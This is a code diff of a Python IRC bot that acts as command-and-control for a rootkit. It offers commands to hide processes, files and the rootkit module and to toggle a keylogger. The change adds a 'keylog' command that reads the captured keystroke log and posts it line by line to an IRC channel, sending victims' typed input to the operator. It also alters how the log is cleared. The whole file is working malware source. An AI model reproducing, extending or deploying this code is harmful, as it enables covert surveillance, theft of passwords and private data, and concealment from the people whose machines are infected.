@@ -23,18 +23,21 @@ Bot commands are:
     -------dcc -- Command a bot DCC CHAT invite connection.
 
     ROOT COMMANDS -------
-
     hpXXXX -- Hide a process id.
     sp -- Show the last hidden process.
     tls -- Toggle keylogger on/off. 
     thf -- Toggle files show/hide.
     mh -- Hide the root module. 
     ms -- Show the root module.
+
+    LOG COMMANDS -------
+    keylog -- Print keyboard input log.
 """
-from os import remove
+
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
+from os import remove
 
 import key
 
@@ -49,7 +52,7 @@ debug = True
 
 class Bot(irc.bot.SingleServerIRCBot):
     def __init__(self, channel, nickname, server, port=6667):
-        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname)
+        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
         self.channel = channel
 
     def on_nicknameinuse(self, c, e):
@@ -106,19 +109,21 @@ class Bot(irc.bot.SingleServerIRCBot):
     # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
         evlog = '/opt/col_log/evlog.txt'
-        log = open(evlog, 'r')
+        log = open(evlog, 'w+')
         f = log.read()
+        kl = key.translate(f)
+        log.truncate()
         # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
-        remove(evlog)
-        kl = key.translate(f)
         return kl
 
 
     def error_log(self):
         # SEND ERROR LOG VIA DCC THEN DELETE
         # errlog = '/opt/col_log/log.txt'
-        # remove(errlog)
+        # f = open(errlog, 'w+')
+        # f.truncate()
+        # f.close()
         pass
 
     def do_command(self, e, cmd):
@@ -179,7 +184,7 @@ class Bot(irc.bot.SingleServerIRCBot):
                 if debug:
                     print "%s" % line
         elif "keylog" == cmd:
-            for k in self.keylogs():
+            for k in self.keylogs().split('\n'):
                 c.notice(channel, k)
                 if debug:
                     print k
@@ -199,6 +204,9 @@ tls -- Toggle keylogger on/off.
 thf -- Toggle files show/hide.
 mh -- Hide the root module (default). 
 ms -- Show the root module.
+
+LOG COMMANDS -------
+keylog -- Print keyboard input log.
 """
 
             c.notice(channel, "BOT COMMANDS --------")
@@ -212,6 +220,8 @@ ms -- Show the root module.
             c.notice(channel, "thf -- Toggle files show/hide  (default is hide).")
             c.notice(channel, "mh -- Hide the root module (default).")
             c.notice(channel, "ms -- Show the root module.")
+            c.notice(channel, "LOG COMMANDS -------")
+            c.notice(channel, "keylog -- Print keyboard input log.")
         else:
             if debug:
                 print nick, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
@@ -219,11 +229,11 @@ ms -- Show the root module.
             c.notice(channel, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname))
 
 def main():
-    bot = Bot(channel, nickname, server, port)
+    colbot = Bot(channel, nickname, server, port)
 
     if debug:
         print "Connecting to %s on port: %d" % (server, port)
-    bot.start()
+    colbot.start()
 
 if __name__ == "__main__":
     main()
